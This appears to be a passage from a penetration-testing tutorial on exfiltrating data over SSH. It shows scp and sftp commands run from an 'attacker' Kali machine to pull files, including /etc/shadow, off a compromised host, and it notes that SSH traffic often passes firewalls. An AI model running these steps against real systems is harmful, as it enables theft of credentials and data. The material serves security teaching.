# On Attacker Machine (Kali Linux) - Pull a file from the compromised system using SCP
kali@attacker:~$ scp user@192.168.1.101:/path/to/sensitive/data.txt .
user@192.168.1.101's password: [enter password]
data.txt                                      100% 2000     1.9MB/s   00:00

# On Attacker Machine - Push a file to the compromised system (less common for exfil)
kali@attacker:~$ scp /tmp/local_file.txt user@192.168.1.101:/tmp/remote_file.txt

# Using SFTP for interactive transfer
kali@attacker:~$ sftp user@192.168.1.101
sftp> get /etc/shadow
Fetching /etc/shadow to shadow
sftp> exit

Benefits of SSH-based Transfers

  • Encryption: All data is encrypted in transit by SSH.
  • Authentication: Leverages strong SSH authentication (passwords, keys).
  • Firewall Friendly: SSH (port 22) is often allowed for legitimate admin access.
  • Reliable: Built on TCP, ensuring reliable delivery.

Prerequisites & Tools

  • SSH Access: Requires valid credentials or SSH keys for the target.
  • Tools: scp (Secure Copy), sftp (SSH File Transfer Protocol).
  • SSH Tunnels: Can also tunnel other protocols over SSH for exfiltration.
Key Takeaway

When SSH access is available, SCP and SFTP are the most secure and straightforward methods for data exfiltration, offering encryption and leveraging commonly permitted network traffic.
